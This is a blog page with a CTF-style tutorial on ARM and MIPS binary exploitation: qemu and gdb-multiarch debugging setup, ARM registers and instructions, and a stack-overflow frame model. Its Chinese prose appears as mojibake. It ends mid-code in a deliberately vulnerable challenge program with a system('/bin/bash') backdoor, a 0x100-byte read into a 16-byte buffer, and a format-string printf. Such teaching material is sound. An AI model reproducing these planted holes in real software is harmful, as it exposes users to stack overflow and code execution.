<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><link rel="mask-icon" href="/%5Bobject%20Object%5D?v=2.6.2" color="#54bcff"><meta property="og:type" content="website">
<meta property="og:title" content="PIG-007">
<meta property="og:url" content="http://pig-007.github.io/page/4/index.html">
<meta property="og:site_name" content="PIG-007">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="PIG-007">
<meta name="twitter:card" content="summary"><title>PIG-007</title><link ref="canonical" href="http://pig-007.github.io/page/4/index.html"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"default","highlight":"light","wordWrap":true},
  reward: false,
  fancybox: false,
  zoomImage: {"gapAside":"20px"},
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Tags</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">Search</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">PIG-007</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content content-home" id="content"><section class="postlist"><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/11/02/%E5%BC%82%E6%9E%84%E4%BB%8E0%E5%BC%80%E5%A7%8B/">Armä»0å¼€å§‹</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-11-02</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2023-09-08</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="å‰è¨€"   >
          <a href="#å‰è¨€" class="heading-link"><i class="fas fa-link"></i></a><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1>
      <p>è®°å½•ä¸€ä¸‹å¼‚æ„çš„PWNé¢˜</p>
<p>ğŸ”ºqemu çš„ user æ¨¡å¼ä¸‹ï¼Œæ‰€ä»¥å³ä¾¿ç¨‹åºé‡å¯ libc åœ°å€ä¹Ÿä¸å˜ï¼Œä½†æ˜¯systemæ¨¡å¼ï¼Œå³åŠ äº†å†…æ ¸çš„æƒ…å†µä¸‹å°±ä¼šæ”¹å˜äº†ã€‚</p>

        <h1 id="ä¸€ã€è°ƒè¯•é—®é¢˜"   >
          <a href="#ä¸€ã€è°ƒè¯•é—®é¢˜" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸€ã€è°ƒè¯•é—®é¢˜" class="headerlink" title="ä¸€ã€è°ƒè¯•é—®é¢˜"></a>ä¸€ã€è°ƒè¯•é—®é¢˜</h1>
      
        <h2 id="1-ARMæ¶æ„"   >
          <a href="#1-ARMæ¶æ„" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-ARMæ¶æ„" class="headerlink" title="1.ARMæ¶æ„"></a>1.ARMæ¶æ„</h2>
      <p><code>pwndbg</code>å¯¹armæ¶æ„çš„æ”¯æŒè¿˜æ˜¯æŒºå¥½çš„</p>

        <h3 id="1-æ— PIE"   >
          <a href="#1-æ— PIE" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-æ— PIE" class="headerlink" title="(1)æ— PIE"></a>(1)æ— PIE</h3>
      <p>æ²¡æœ‰PIEçš„æ—¶å€™ï¼Œç›´æ¥ä½¿ç”¨patchelfå°†å…¶é“¾æ¥å™¨å’Œæœç´¢è·¯å¾„æ”¹ä¸€ä¸‹å³å¯</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-rpath /home/hacker/glibc/2.23/arm/ --set-interpreter /home/hacker/glibc/2.23/arm/lib/ld-linux.so.3 ./armNote</span><br></pre></td></tr></table></div></figure>

<p>ç„¶åé€šè¿‡qemuåŠ è½½è¿è¡Œåº“å¯åŠ¨</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-arm -L /home/hacker/glibc/2.23/arm/ -g 12345 ./armNote</span><br></pre></td></tr></table></div></figure>

<p>ä¹‹åé€šè¿‡gdb-multiarchè¿æ¥ä¸Šå³å¯</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch -q armNote</span><br><span class="line">target remote: 12345</span><br></pre></td></tr></table></div></figure>

<p>è¿™æ ·å°±èƒ½è°ƒè¯•äº†ï¼ŒåŒ…æ‹¬pwndbgä¸­çš„å †å—heapï¼Œbinså‘½ä»¤ç­‰ä¹Ÿå¯ä»¥ä½¿ç”¨ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121161707.png" alt="image-20211121161707292"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121161725.png" alt="image-20211121161725233"></p>

        <h3 id="2-æœ‰PIE"   >
          <a href="#2-æœ‰PIE" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-æœ‰PIE" class="headerlink" title="(2)æœ‰PIE"></a>(2)æœ‰PIE</h3>
      <p>è¿™ä¸ªå°±æ¯”è¾ƒå¤æ‚äº†ï¼Œé¦–å…ˆè¿˜æ˜¯æ”¹æ‰ç”¨é“¾æ¥å™¨å’Œæœç´¢è·¯å¾„ï¼Œä¹‹åè¿è¡Œèµ·æ¥ï¼ŒæŸ¥çœ‹vmmap</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121162647.png" alt="image-20211121162647509"></p>
<p>è¿™é‡Œåœ¨stackçš„æœ«å°¾ï¼Œå³å›¾ä¸­è“è‰²æ¡†èµ·æ¥çš„å°±æ˜¯elfåŸºåœ°å€ï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œåæ­£è°ƒè¯•å°±æ˜¯è¿™æ ·çš„ï¼Œå¯èƒ½æ˜¯QEMUå’ŒPIEçš„ç›¸å…³æœºåˆ¶é—®é¢˜æŠŠã€‚</p>
<p>ä¹‹åé€šè¿‡elfBaseæ¥æ–­ç‚¹ï¼Œå†é€šè¿‡gotè¡¨å³å¯æ‰¾åˆ°libcåŸºåœ°å€äº†ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121163058.png" alt="image-20211121163058346"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121163230.png" alt="image-20211121163230165"></p>
<p>ä¹‹åå†é€šè¿‡<code>add-symbol-file</code>å³å¯å¾—åˆ°åœ°å€äº†ï¼Œåœ°å€ç”±äºqemuçš„å…³ç³»ï¼Œä¸€ç›´æ˜¯ä¸å˜çš„ã€‚</p>
<p>ä½†æ˜¯è¿™é‡Œå¦‚æœç›´æ¥æ‰“å°åœ°å€ä¼šå‡ºé”™ï¼ŒåŸå› æœªçŸ¥ï¼Œéœ€è¦é‡è½½ç¬¦å·è¡¨</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121163909.png" alt="image-20211121163909059"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121164400.png" alt="image-20211121164400425"></p>
<p>é‡è½½ç¬¦å·è¡¨å¦‚ä¸‹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121164500.png" alt="image-20211121164500582"></p>
<p>å¯ä»¥çœ‹åˆ°ä¹‹åå°±æ­£ç¡®äº†ã€‚</p>
<p>ä¸è¿‡è¿˜æ˜¯æ²¡æœ‰åŠæ³•è¿›è¡Œbinsï¼Œheapä¹‹ç±»çš„å‘½ä»¤ã€‚è¿™ä¸ªå‘½ä»¤æ˜¯pwndbgä»<code>__libc_malloc_initialized</code>è¿™ä¸ªå…¨å±€ç¬¦å·è·å–çš„ï¼Œä½†æ˜¯æ·»åŠ äº†ç¬¦å·è¡¨ä¹‹åè¿™ä¸ªå…¨å±€ç¬¦å·è¿˜æ˜¯æ²¡æœ‰è¢«é‡æ–°åŠ è½½</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121165405.png" alt="image-20211121165405192"></p>
<p>å¯¼è‡´æ— æ³•è¯†åˆ«ï¼Œæ‰€ä»¥ä¹Ÿå°±æ— æ³•ä½¿ç”¨å †ç›¸å…³å‘½ä»¤ï¼Œä¸è¿‡å¯ä»¥ä»main_arenä¸­ç®€å•çœ‹ä¸€ä¸‹å †ç»“æ„</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211121170328.png" alt="image-20211121170328689"></p>

        <h2 id="2-MIPSæ¶æ„"   >
          <a href="#2-MIPSæ¶æ„" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-MIPSæ¶æ„" class="headerlink" title="2.MIPSæ¶æ„"></a>2.MIPSæ¶æ„</h2>
      
        <h3 id="1-æ— PIE-1"   >
          <a href="#1-æ— PIE-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-æ— PIE-1" class="headerlink" title="(1)æ— PIE"></a>(1)æ— PIE</h3>
      <p>å¯ä»¥ç›´æ¥è¿›è¡Œç›¸åº”è¿è¡Œåº“åŠ è½½å³å¯ï¼Œä½†æ˜¯æœ€å¥½è¿˜æ˜¯ç”¨gefæ’ä»¶ã€‚</p>

        <h3 id="2-æœ‰PIE-1"   >
          <a href="#2-æœ‰PIE-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-æœ‰PIE-1" class="headerlink" title="(2)æœ‰PIE"></a>(2)æœ‰PIE</h3>
      <p>pwndbgå¯¹mipsæ¶æ„çš„æ”¯æŒä¸å¤ªå¥½ï¼Œä½†æ˜¯ä¹Ÿç”±äºgefå…³äºqemuçš„vmmapå‘½ä»¤ä¸å¤ªå‡†ç¡®ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥å€ŸåŠ©pwndbgçš„vmmapå‘½ä»¤è·å–ï¼Œå¦‚åŒä¹‹å‰çš„armæ¶æ„ä¸€æ ·ï¼Œè·å–åˆ°elfåŸºåœ°å€ä¹‹åå³å¯æŸ¥çœ‹å¯¹åº”çš„libcåœ°å€ã€‚</p>

        <h2 id="é¡¹ç›®ï¼š"   >
          <a href="#é¡¹ç›®ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#é¡¹ç›®ï¼š" class="headerlink" title="é¡¹ç›®ï¼š"></a>é¡¹ç›®ï¼š</h2>
      <p>æˆ–è€…çœ‹é¡¹ç›®ï¼Œè¿™ä¸ªå¯ä»¥ä¸€é”®è·å–å¯¹åº”ç‰ˆæœ¬çš„glibcï¼Œåœ¨gdbè°ƒè¯•ä¸­è‡ªåŠ¨è§£æç¬¦å·è¡¨å’Œåœ°å€ï¼Œæ–¹ä¾¿åšå¼‚æ„çš„pwné¢˜ã€‚</p>
<p><code>mulArchAll</code>:<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/PIG-007/mulArchAll.git" >https://github.com/PIG-007/mulArchAll.git</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="äºŒã€ARM"   >
          <a href="#äºŒã€ARM" class="heading-link"><i class="fas fa-link"></i></a><a href="#äºŒã€ARM" class="headerlink" title="äºŒã€ARM"></a>äºŒã€ARM</h1>
      
        <h2 id="1-å¯„å­˜å™¨å…³ç³»"   >
          <a href="#1-å¯„å­˜å™¨å…³ç³»" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å¯„å­˜å™¨å…³ç³»" class="headerlink" title="1.å¯„å­˜å™¨å…³ç³»"></a>1.å¯„å­˜å™¨å…³ç³»</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211103145318.png" alt="32"></p>
<ul>
<li><p>R0<del>R3ï¼šå‡½æ•°è°ƒç”¨å‚æ•°ï¼Œä»£è¡¨ç¬¬0</del>4ä¸ªå‚æ•°ï¼Œå‰©ä¸‹çš„å‚æ•°ä»å³å‘å·¦ä¾æ¬¡å…¥æ ˆï¼Œå‡½æ•°è¿”å›å€¼ä¿å­˜åœ¨R0ä¸­ã€‚(å¯¹åº”åœ¨aarch64ä¸­ä¸ºR0<del>R7ï¼Œä½†æ˜¯gdbè°ƒè¯•æˆ–è€…IDAä¸­ä¸€èˆ¬æ˜¾ç¤ºX0</del>X30ï¼ŒåŒæ—¶è¿˜æœ‰ä½32ä½çš„W0~W30)</p>
</li>
<li><p>SPï¼šç±»ä¼¼rsp,espï¼Œæ ˆæŒ‡é’ˆ</p>
</li>
<li><p>FPï¼šç±»ä¼¼ebpï¼Œæ ˆæŒ‡é’ˆ</p>
</li>
<li><p>LRï¼šå½“å‘ç”Ÿå‡½æ•°è°ƒç”¨æ—¶ï¼Œä¼šä¿å­˜è°ƒç”¨å‡½æ•°å¤„çš„åœ°å€ï¼Œé€€å‡ºå‡½æ•°æ—¶èµ‹å€¼ç»™PCã€‚</p>
</li>
<li><p>PCï¼šç±»ä¼¼eip,ripï¼Œå­˜å‚¨ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ã€‚</p>
</li>
<li><p>R11ï¼šç±»ä¼¼ebpï¼Œæ ˆæŒ‡é’ˆï¼Œå…¶å®å°±å·®ä¸å¤šæ˜¯FP</p>
</li>
</ul>

        <h2 id="2-æ±‡ç¼–æŒ‡ä»¤"   >
          <a href="#2-æ±‡ç¼–æŒ‡ä»¤" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-æ±‡ç¼–æŒ‡ä»¤" class="headerlink" title="2.æ±‡ç¼–æŒ‡ä»¤"></a>2.æ±‡ç¼–æŒ‡ä»¤</h2>
      
        <h3 id="1-å¯„å­˜å™¨ä¼ é€MOV"   >
          <a href="#1-å¯„å­˜å™¨ä¼ é€MOV" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å¯„å­˜å™¨ä¼ é€MOV" class="headerlink" title="(1)å¯„å­˜å™¨ä¼ é€MOV"></a>(1)å¯„å­˜å™¨ä¼ é€MOV</h3>
      <p>å¯„å­˜å™¨ä¹‹é—´è¿˜æ˜¯MOVæŒ‡ä»¤ï¼Œæ¯”å¦‚MOV R2,R0;ä½†æ˜¯å¦‚æœæ¶‰åŠåˆ°å†…å­˜ä¸Šçš„ï¼Œåˆ™éœ€è¦å…ˆåŠ è½½åˆ°å¯„å­˜å™¨ä¸­ï¼Œæˆ–è€…æŠŠå¯„å­˜å™¨ä¸­çš„å€¼å­˜å‚¨åˆ°å†…å­˜ä¸­</p>

        <h3 id="2-å¯„å­˜å™¨-å†…å­˜ä¼ é€"   >
          <a href="#2-å¯„å­˜å™¨-å†…å­˜ä¼ é€" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-å¯„å­˜å™¨-å†…å­˜ä¼ é€" class="headerlink" title="(2)å¯„å­˜å™¨-å†…å­˜ä¼ é€"></a>(2)å¯„å­˜å™¨-å†…å­˜ä¼ é€</h3>
      <p>STR(store reg)/LDR(load reg)ä»¥åŠSTM(store multiple)/LDM(load multiple)</p>

        <h4 id="â‘ STR-LDRæ¨¡å¼"   >
          <a href="#â‘ STR-LDRæ¨¡å¼" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ STR-LDRæ¨¡å¼" class="headerlink" title="â‘ STR/LDRæ¨¡å¼"></a>â‘ STR/LDRæ¨¡å¼</h4>
      
        <h5 id="STR-Ra-Rb-ï¼š"   >
          <a href="#STR-Ra-Rb-ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#STR-Ra-Rb-ï¼š" class="headerlink" title="STR Ra [Rb]ï¼š"></a>STR Ra [Rb]ï¼š</h5>
      <p>Raä¸­çš„æ•°æ®å­˜å‚¨åˆ°RbæŒ‡å‘çš„å†…å­˜ä¸­</p>

        <h5 id="LDR-Ra-Rb"   >
          <a href="#LDR-Ra-Rb" class="heading-link"><i class="fas fa-link"></i></a><a href="#LDR-Ra-Rb" class="headerlink" title="LDR Ra [Rb]"></a>LDR Ra [Rb]</h5>
      <p>RbæŒ‡å‘çš„å†…å­˜ä¸­çš„å€¼åŠ è½½åˆ°Raä¸­</p>
<p>æ­¤å¤–è¿˜æœ‰å¦‚ä¸‹æƒ…å½¢</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">STR  R0,[R1, #12]  // R0 --&gt; [R1+12]</span><br><span class="line">LDR  R4,[R5, R6]  // R4 &lt;-- [R5+R6]</span><br></pre></td></tr></table></div></figure>




        <h4 id="â‘¡STM-LDMæ¨¡å¼"   >
          <a href="#â‘¡STM-LDMæ¨¡å¼" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡STM-LDMæ¨¡å¼" class="headerlink" title="â‘¡STM/LDMæ¨¡å¼"></a>â‘¡STM/LDMæ¨¡å¼</h4>
      
        <h5 id="STM-R0-R4-R5"   >
          <a href="#STM-R0-R4-R5" class="heading-link"><i class="fas fa-link"></i></a><a href="#STM-R0-R4-R5" class="headerlink" title="STM R0, {R4,R5}"></a>STM R0, {R4,R5}</h5>
      <p>R4çš„å€¼ä¼ é€ç»™R0+xå¯¹åº”çš„å†…å­˜å•å…ƒï¼Œç„¶åR5çš„å€¼ä¼ ç»™R0+x+xå¯¹åº”çš„å†…å­˜å•å…ƒ</p>
<p>è¿™ä¸ªxå³ç”±åç¼€å†³å®šï¼Œåˆ†åˆ«æœ‰ä»¥ä¸‹å‡ ç§</p>
<ul>
<li><p>DB(Decrease Before)ï¼šæ¯æ¬¡ä¼ é€å‰R0åŠ ä¸Šxï¼Œxä¸ºè´Ÿæ•°</p>
</li>
<li><p>DA(Decrease After)ï¼šæ¯æ¬¡ä¼ é€åR0åŠ ä¸Šxï¼Œxä¸ºè´Ÿæ•°</p>
</li>
<li><p>IB(Increase Before)ï¼šæ¯æ¬¡ä¼ é€å‰R0åŠ ä¸Šxï¼Œxä¸ºæ­£æ•°</p>
</li>
<li><p>IA(Increase After)ï¼šæ¯æ¬¡ä¼ é€åR0åŠ ä¸Šxï¼Œxä¸ºæ­£æ•°</p>
</li>
</ul>
<p>è€ŒXåˆ™åœ¨ä¸åŒçš„CPUä½æ•°ä¸‹ä¸åŒï¼Œ32ä¸º4ï¼Œ64åˆ™ä¸º8ã€‚</p>
<p>æ­¤å¤–å †æ ˆçš„å¢é•¿æ–¹å‘å¯ä»¥ä¸åŒï¼Œä¹Ÿå¯ä»¥åœ¨ä¸åŒæƒ…å½¢ä¸‹ä½œä¸ºåç¼€ï¼Œæ•ˆæœä¸€æ ·çš„</p>
<ul>
<li>FD(Full Descent)ï¼šæ»¡é€’å‡å †æ ˆ</li>
<li>FA(Full Ascent)ï¼šæ»¡é€’å¢å †æ ˆ</li>
<li>ED(Empty Descent)ï¼šç©ºé€’å‡å †æ ˆ</li>
<li>EA(Empty Ascent)ï¼šç©ºé€’å¢å †æ ˆ</li>
</ul>
<p>æ»¡åˆ™ä»£è¡¨æ ˆæŒ‡é’ˆæŒ‡å‘æ ˆé¡¶ï¼Œç©ºåˆ™ä»£è¡¨æ ˆæŒ‡é’ˆä¸æŒ‡å‘æ ˆé¡¶</p>

        <h3 id="3-è·³è½¬æŒ‡ä»¤"   >
          <a href="#3-è·³è½¬æŒ‡ä»¤" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-è·³è½¬æŒ‡ä»¤" class="headerlink" title="(3)è·³è½¬æŒ‡ä»¤"></a>(3)è·³è½¬æŒ‡ä»¤</h3>
      
        <h4 id="â‘ åˆ†æ”¯è·³è½¬-Branch"   >
          <a href="#â‘ åˆ†æ”¯è·³è½¬-Branch" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ åˆ†æ”¯è·³è½¬-Branch" class="headerlink" title="â‘ åˆ†æ”¯è·³è½¬(Branch)"></a>â‘ åˆ†æ”¯è·³è½¬(Branch)</h4>
      
        <h5 id="B"   >
          <a href="#B" class="heading-link"><i class="fas fa-link"></i></a><a href="#B" class="headerlink" title="B"></a>B</h5>
      <p>æ— æ¡ä»¶è·³è½¬</p>

        <h5 id="BX-lt-Rm-gt"   >
          <a href="#BX-lt-Rm-gt" class="heading-link"><i class="fas fa-link"></i></a><a href="#BX-lt-Rm-gt" class="headerlink" title="BX &lt;Rm&gt;"></a>BX &lt;Rm&gt;</h5>
      <p>ç”±å¯„å­˜å™¨ç»™å‡ºåœ°å€</p>
<p>è‹¥ Rm çš„ bit[0] ä¸º1ï¼Œåˆ‡æ¢åˆ° Thumb æŒ‡ä»¤æ‰§è¡Œï¼›</p>
<p>è‹¥ Rm çš„ bit[0] ä¸º0ï¼Œåˆ‡æ¢åˆ° ARM æŒ‡ä»¤æ‰§è¡Œã€‚</p>

        <h5 id="BL"   >
          <a href="#BL" class="heading-link"><i class="fas fa-link"></i></a><a href="#BL" class="headerlink" title="BL"></a>BL</h5>
      <p>ç±»ä¼¼äºCallï¼Œä¼šå­˜å…¥è¿”å›åœ°å€åˆ°LRå¯„å­˜å™¨</p>

        <h5 id="BLX-BLR"   >
          <a href="#BLX-BLR" class="heading-link"><i class="fas fa-link"></i></a><a href="#BLX-BLR" class="headerlink" title="BLX/BLR"></a>BLX/BLR</h5>
      <p>å³ç±»ä¼¼å¯¹åº”ç»„åˆ</p>

        <h4 id="â‘¡æ¡ä»¶è·³è½¬"   >
          <a href="#â‘¡æ¡ä»¶è·³è½¬" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡æ¡ä»¶è·³è½¬" class="headerlink" title="â‘¡æ¡ä»¶è·³è½¬"></a>â‘¡æ¡ä»¶è·³è½¬</h4>
      <p>ä¾æ®CPSRå¯„å­˜å™¨ä¸‹çš„ALUçŠ¶æ€æ ‡å¿—ä½</p>
<p>CPSRå¯„å­˜å™¨åŒ…å«ä¸‹é¢çš„ALUçŠ¶æ€æ ‡å¿—ï¼š</p>
<p>ã€€ã€€Nã€€ Set when the result of the operation was Negative(ç»“æœä¸ºè´Ÿæ•°)</p>
<p>ã€€ã€€Z    Set when the result of the operation was Zero(ç»“æœä¸º0)</p>
<p>ã€€ã€€C    Set when the operation result in a Carry(å‘ç”Ÿè¿›ä½ï¼Œæˆ–å€Ÿä½)</p>
<p>ã€€ã€€V    Set when the operation caused oVerflow(æ“ä½œé€ æˆæº¢å‡º)</p>
<p>ã€€ã€€Q    ARM architecture v5E only sticky flag</p>
<p>è¿˜æœ‰BEQã€BNE</p>

        <h2 id="2-éå¶å­å‡½æ•°æº¢å‡º"   >
          <a href="#2-éå¶å­å‡½æ•°æº¢å‡º" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-éå¶å­å‡½æ•°æº¢å‡º" class="headerlink" title="2.éå¶å­å‡½æ•°æº¢å‡º"></a>2.éå¶å­å‡½æ•°æº¢å‡º</h2>
      
        <h3 id="1-æ ˆæ¨¡å‹"   >
          <a href="#1-æ ˆæ¨¡å‹" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-æ ˆæ¨¡å‹" class="headerlink" title="(1)æ ˆæ¨¡å‹"></a>(1)æ ˆæ¨¡å‹</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#æ³¨é‡Šå¤´</span><br><span class="line"></span><br><span class="line">+-------------+</span><br><span class="line">|             |</span><br><span class="line">|  padding    |</span><br><span class="line">+-------------+</span><br><span class="line">| 	Last FP   | </span><br><span class="line">+-------------+</span><br><span class="line">| return_addr |&lt;- frame pointer</span><br><span class="line">+-------------+</span><br></pre></td></tr></table></div></figure>

<p>å…ˆå‹å…¥LRï¼Œå†å‹å…¥FPï¼Œå½“å‰çš„FPæŒ‡é’ˆæŒ‡å‘çš„å†…å®¹ä¸ºLRä¿å­˜çš„è¿”å›åœ°å€</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211103144726.png" alt="image-20211103144720968"></p>

        <h3 id="2-é¢˜ç›®ï¼š"   >
          <a href="#2-é¢˜ç›®ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-é¢˜ç›®ï¼š" class="headerlink" title="(2)é¢˜ç›®ï¼š"></a>(2)é¢˜ç›®ï¼š</h3>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> bss[<span class="number">0x50</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">backdoor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">myFunc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">16</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please input your name:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>,name,<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello! &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, 